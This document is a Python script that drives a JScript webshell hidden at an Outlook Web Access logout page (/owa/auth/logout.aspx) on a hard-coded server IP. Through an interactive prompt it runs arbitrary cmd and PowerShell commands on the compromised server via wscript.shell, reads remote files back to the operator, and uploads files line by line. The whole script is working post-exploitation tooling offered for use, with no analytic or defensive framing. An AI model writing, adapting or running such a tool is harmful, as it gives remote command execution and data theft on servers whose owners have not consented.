import requests
import base64
import time
import warnings

HOST = "34.68.42.174"
URL = "/owa/auth/logout.aspx"
GET_PARAMETERS = "?passwd=aaaaaa"
OUT_FILE = "output22.txt"


def base64_encode(text):
    """
    Encode any string to base64
    :param text: string
    :return: base64 encoded string
    """
    base64text = base64.b64encode(text.encode('UTF-8')).decode()
    return base64text


def send_code(host, url, get_parameters, code, save_result=False):
    """
    Send a piece of code to run on the Jscript webshell
    :param host: string, server ip or domain address
    :param url: string, path to the webshell
    :param get_parameters: string, get parameters
    :param code: string, Jscript code to run
    :param save_result: boolean, saves result to output file, default is False
    :return: returns the webpage output
    """
    webpage_output = requests.get(f"https://{host}{url}{get_parameters}{code}", verify=False, allow_redirects=True)
    if save_result:
        with open('output.txt', 'w') as output_file:
            output_file.write(webpage_output.text)
    return webpage_output.text


def jscript_write_file(remote_file_path, chunk):
    """
    Sends jscript that writes a file
    :param remote_file_path: Remote file path
    :param chunk: Data to write, new line will be added
    :return:
    """
    jscript_code = "var myFileSysObj = new ActiveXObject('Scripting.FileSystemObject');" \
                   f"var myInputTextStream = myFileSysObj.OpenTextFile('{remote_file_path}', 8, true);" \
                   f"myInputTextStream.WriteLine('{chunk}');" \
                   "myInputTextStream.Close();"
    send_code(HOST, URL, GET_PARAMETERS, base64_encode(jscript_code))


def jscript_read_file(remote_file_path):
    """
    Sends jscript that reads a file, will save it locally to output.txt
    :param remote_file_path:
    :return:
    """
    jscript_code = "var myFileSysObj = new ActiveXObject('Scripting.FileSystemObject');" \
                   "var myOutputTextStream = myFileSysObj.OpenTextFile" \
                   f"('{remote_file_path}', 1, true);" \
                   "var x = '';" \
                   "while (!myOutputTextStream.AtEndOfStream){x += myOutputTextStream.ReadLine() + '\\n';}" \
                   "x;myOutputTextStream.Close();"
    send_code(HOST, URL, GET_PARAMETERS, base64_encode(jscript_code), True)


def run_cmd_command(command, delay, print_output=True, use_tmp_file=True):
    """
    Run a cmd command
    :param command: string, cmd command to run
    :param delay: int, secs of delay before getting the result of the command
    :param print_output: boolean, optionally disable output printing
    :param use_tmp_file: boolean, optionally, if output isn't printed, don't create a temp file
    :return: output of the command
    """
    send_cmd = "var oShell = new ActiveXObject('wscript.shell');" \
               f"oShell.Run('cmd.exe /c {command} > C:\\\\ProgramData\\\\{OUT_FILE} 2>&1');"

    send_cmd_no_tmp_file = "var oShell = new ActiveXObject('wscript.shell');" \
                           f"oShell.Run('cmd.exe /c {command} ');"

    get_cmd_result = "var myFileSysObj = new ActiveXObject('Scripting.FileSystemObject');" \
                     "var myOutputTextStream = myFileSysObj.OpenTextFile" \
                     f"('C:\\\\ProgramData\\\\{OUT_FILE}', 1, true);" \
                     "var x = '';" \
                     "while (!myOutputTextStream.AtEndOfStream){x += myOutputTextStream.ReadLine() + '\\n';}" \
                     "x;myOutputTextStream.Close();"

    if use_tmp_file:
        send_code(HOST, URL, GET_PARAMETERS, base64_encode(send_cmd))
    else:
        send_code(HOST, URL, GET_PARAMETERS, base64_encode(send_cmd_no_tmp_file))
    cmd_output = ""
    if delay > 0:
        time.sleep(delay)
    if print_output:
        cmd_output = send_code(HOST, URL, GET_PARAMETERS, base64_encode(get_cmd_result), True)
    return cmd_output


def run_powershell_command(command, delay, print_output=True, use_tmp_file=True):
    """
        Run a cmd command
        :param command: string, cmd command to run
        :param delay: int, secs of delay before getting the result of the command
        :param print_output: boolean, optionally disable output printing
        :param use_tmp_file: boolean, optionally, if output isn't printed, don't create a temp file
        :return: output of the command
        """
    send_cmd = "var oShell = new ActiveXObject('wscript.shell');" \
               f"oShell.Run('powershell.exe {command} | Out-File \\'C:\\\\ProgramData\\\\{OUT_FILE}\\' ');"

    send_cmd_no_tmp_file = "var oShell = new ActiveXObject('wscript.shell');" \
                           f"oShell.Run('cmd.exe /c {command} ');"

    get_cmd_result = "var myFileSysObj = new ActiveXObject('Scripting.FileSystemObject');" \
                     "var myOutputTextStream = myFileSysObj.OpenTextFile" \
                     f"('C:\\\\ProgramData\\\\{OUT_FILE}', 1, true);" \
                     "var x = '';" \
                     "while (!myOutputTextStream.AtEndOfStream){x += myOutputTextStream.ReadLine() + '\\n';}" \
                     "x;myOutputTextStream.Close();"

    if use_tmp_file:
        send_code(HOST, URL, GET_PARAMETERS, base64_encode(send_cmd))
    else:
        send_code(HOST, URL, GET_PARAMETERS, base64_encode(send_cmd_no_tmp_file))
    cmd_output = ""
    if delay > 0:
        time.sleep(delay)
    if print_output:
        cmd_output = send_code(HOST, URL, GET_PARAMETERS, base64_encode(get_cmd_result), True)
    return cmd_output


def send_base64encoded_file(origin_path, destination_file_name):
    """
    Upload a file to the server
    :param origin_path: local file path
    :param destination_file_name: remote file path
    :return:
    """
    file_object = open(origin_path)
    data = file_object.readlines()
    data_length = len(data)
    i = 0
    for chunk in data:
        jscript_write_file(f"C:\\\\ProgramData\\\\{destination_file_name}", chunk[0:-1])
        i += 1
        print(f'Wrote {str(i)}\\{str(data_length)} lines')


def main():
    # shell Settings
    # warnings.filterwarnings("ignore")
    run_in_shell = True
    delay = 0
    # main loop
    while run_in_shell:
        user_input = input("> ")
        if user_input == "exit":
            run_in_shell = False
        elif user_input == "set_delay":
            delay = int(input("set a new delay, int only> "))
        elif user_input == "upload_file":
            origin_path = input("Please enter local file path to upload> ")
            remote_path = input("Please enter destination file name> ")
            send_base64encoded_file(origin_path, remote_path)
        elif user_input == "download_file":
            remote_path = input("Please enter file path to download> ")
            jscript_read_file(remote_path)
        elif user_input == "help":
            print("type any cmd command to run")
            print("type 'upload_file' to upload a file (already base64 encoded)")
            print("type 'download_file' to download a file, will be saved to output.txt")
            print("type 'set_delay' to change delay before outputting the result")
            print("type 'del_output_file' to delete the temp output file")
            print("type 'exit' to exit the script")
        elif user_input == "del_output_file":
            run_cmd_command('del \\..\\..\\..\\..\\ProgramData\\test.txt', 1, False, False)
        elif user_input == "run_cmd_debug":
            run_cmd_command(input('cmd> '), 0, False, False)
        elif user_input == "run_powershell":
            run_cmd_command(input('powershell> '), delay)
        else:
            cmd_output = run_cmd_command(f'{user_input} ', delay)
            print(cmd_output)


if __name__ == '__main__':
    main()
